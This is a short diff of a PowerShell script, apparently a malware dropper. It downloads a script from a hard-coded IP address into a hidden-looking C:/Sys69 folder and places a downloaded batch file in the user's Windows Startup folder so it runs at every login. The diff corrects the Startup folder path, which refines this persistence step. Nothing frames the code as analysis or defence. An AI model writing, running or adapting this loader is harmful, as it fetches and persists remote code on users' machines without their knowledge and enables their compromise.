@@ -1,6 +1,5 @@
 $curpath = Get-Location;
 $WebClient = New-Object System.Net.WebClient;
-
 Set-Location /;
 if (Test-Path -Path "Sys69") {
 
@@ -10,8 +9,7 @@ else {
 }
 Set-Location Sys69;
 $WebClient.DownloadFile("http://139.162.197.217:8080/raa.ps1","C:/Sys69/startup.ps1");
-Set-Location $curpath;
-Set-Location "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+Set-Location "~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
 $startupdir = Get-Location;
 $rouf = Join-Path -Path $startupdir -ChildPath "rouf.bat";
 $WebClient.DownloadFile("http://139.162.197.217:8080/rouf.bat", $rouf);
